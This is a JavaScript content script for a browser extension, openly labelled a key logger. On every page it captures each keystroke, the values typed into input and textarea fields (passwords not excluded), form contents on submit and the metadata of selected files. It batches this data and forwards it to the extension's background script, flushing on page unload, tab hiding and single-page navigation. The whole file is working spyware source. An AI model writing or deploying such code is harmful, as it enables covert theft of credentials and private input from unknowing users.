// Key logger content script
// This script runs on web pages and captures keyboard events

const browserAPI = typeof browser !== 'undefined' ? browser : chrome;

// Buffer for storing keystrokes before sending
let keystrokeBuffer = [];
const BUFFER_SIZE = 10; // Send after 10 keystrokes or timeout
const SEND_TIMEOUT = 5000; // Send after 5 seconds
let sendTimer = null;

// Buffer for storing input field values
let inputValuesBuffer = [];
let fileInputsBuffer = [];

// Track current page info
let pageInfo = {
  url: window.location.href,
  title: document.title,
  timestamp: new Date().toISOString()
};

/**
 * Send keystroke data to background script
 */
function sendKeystrokes() {
  if (keystrokeBuffer.length === 0) {
    return;
  }

  const data = {
    ...pageInfo,
    keystrokes: keystrokeBuffer,
    count: keystrokeBuffer.length,
    timestamp: new Date().toISOString()
  };

  // Add input values if available
  if (inputValuesBuffer.length > 0) {
    data.inputValues = inputValuesBuffer;
    inputValuesBuffer = [];
  }

  // Add file inputs if available
  if (fileInputsBuffer.length > 0) {
    data.fileInputs = fileInputsBuffer;
    fileInputsBuffer = [];
  }

  // Send to background script
  browserAPI.runtime.sendMessage({
    type: 'keystrokes',
    data: data
  }).catch(err => {
    console.error('Error sending keystrokes:', err);
  });

  // Clear buffer
  keystrokeBuffer = [];
  
  // Clear timer
  if (sendTimer) {
    clearTimeout(sendTimer);
    sendTimer = null;
  }
}

/**
 * Schedule sending keystrokes
 */
function scheduleSend() {
  if (sendTimer) {
    clearTimeout(sendTimer);
  }
  sendTimer = setTimeout(sendKeystrokes, SEND_TIMEOUT);
}

/**
 * Capture keystroke event
 */
function captureKeystroke(event) {
  const keystroke = {
    key: event.key,
    code: event.code,
    timestamp: new Date().toISOString(),
    element: event.target.tagName,
    elementId: event.target.id || null,
    elementName: event.target.name || null,
    elementType: event.target.type || null,
    keyCode: event.keyCode,
    altKey: event.altKey,
    ctrlKey: event.ctrlKey,
    shiftKey: event.shiftKey,
    metaKey: event.metaKey
  };

  keystrokeBuffer.push(keystroke);

  // Send immediately if buffer is full
  if (keystrokeBuffer.length >= BUFFER_SIZE) {
    sendKeystrokes();
  } else {
    scheduleSend();
  }
}

/**
 * Capture input field final value
 */
function captureInputValue(event) {
  const element = event.target;
  
  // Skip file inputs - they're handled separately
  if (element.type === 'file') {
    return;
  }

  // Skip empty values
  if (!element.value || element.value.trim() === '') {
    return;
  }

  const inputData = {
    value: element.value,
    timestamp: new Date().toISOString(),
    element: element.tagName,
    elementId: element.id || null,
    elementName: element.name || null,
    elementType: element.type || null,
    elementClass: element.className || null,
    placeholder: element.placeholder || null,
    pageTitle: document.title,
    pageUrl: window.location.href
  };

  inputValuesBuffer.push(inputData);
  scheduleSend();
}

/**
 * Capture file input
 */
function captureFileInput(event) {
  const element = event.target;
  
  if (element.type !== 'file' || !element.files || element.files.length === 0) {
    return;
  }

  const files = Array.from(element.files).map(file => ({
    name: file.name,
    size: file.size,
    type: file.type,
    lastModified: new Date(file.lastModified).toISOString()
  }));

  const fileInputData = {
    files: files,
    timestamp: new Date().toISOString(),
    elementId: element.id || null,
    elementName: element.name || null,
    elementClass: element.className || null,
    multiple: element.multiple
  };

  fileInputsBuffer.push(fileInputData);
  scheduleSend();
}

/**
 * Initialize key logger
 */
function initKeyLogger() {
  console.log('Key logger initialized on:', pageInfo.url);

  // Listen to keydown events
  document.addEventListener('keydown', captureKeystroke, true);

  // Listen to keypress events (for additional info)
  document.addEventListener('keypress', (event) => {
    // Optionally capture keypress for special cases
  }, true);

  // Capture input field values on blur (when user leaves the field)
  document.addEventListener('blur', (event) => {
    if (event.target.matches('input, textarea')) {
      captureInputValue(event);
    }
  }, true);

  // Capture input field values on change event
  document.addEventListener('change', (event) => {
    if (event.target.matches('input, textarea, select')) {
      if (event.target.type === 'file') {
        captureFileInput(event);
      } else {
        captureInputValue(event);
      }
    }
  }, true);

  // Capture form submissions
  document.addEventListener('submit', (event) => {
    const form = event.target;
    if (form.tagName === 'FORM') {
      // Capture all input values in the form
      const inputs = form.querySelectorAll('input, textarea, select');
      inputs.forEach(input => {
        if (input.type === 'file') {
          captureFileInput({ target: input });
        } else if (input.value) {
          captureInputValue({ target: input });
        }
      });
      // Send immediately on form submit
      sendKeystrokes();
    }
  }, true);

  // Update page info when URL changes (SPA navigation)
  const observer = new MutationObserver(() => {
    if (window.location.href !== pageInfo.url || document.title !== pageInfo.title) {
      // Send remaining keystrokes before updating page info
      sendKeystrokes();
      
      // Update page info
      pageInfo = {
        url: window.location.href,
        title: document.title,
        timestamp: new Date().toISOString()
      };
      console.log('Page changed:', pageInfo.url);
    }
  });

  observer.observe(document.querySelector('title') || document.head, {
    childList: true,
    subtree: true
  });

  // Send remaining keystrokes before page unload
  window.addEventListener('beforeunload', () => {
    sendKeystrokes();
  });

  // Send remaining keystrokes when page becomes hidden
  document.addEventListener('visibilitychange', () => {
    if (document.hidden) {
      sendKeystrokes();
    }
  });
}

// Initialize when DOM is ready
if (document.readyState === 'loading') {
  document.addEventListener('DOMContentLoaded', initKeyLogger);
} else {
  initKeyLogger();
}
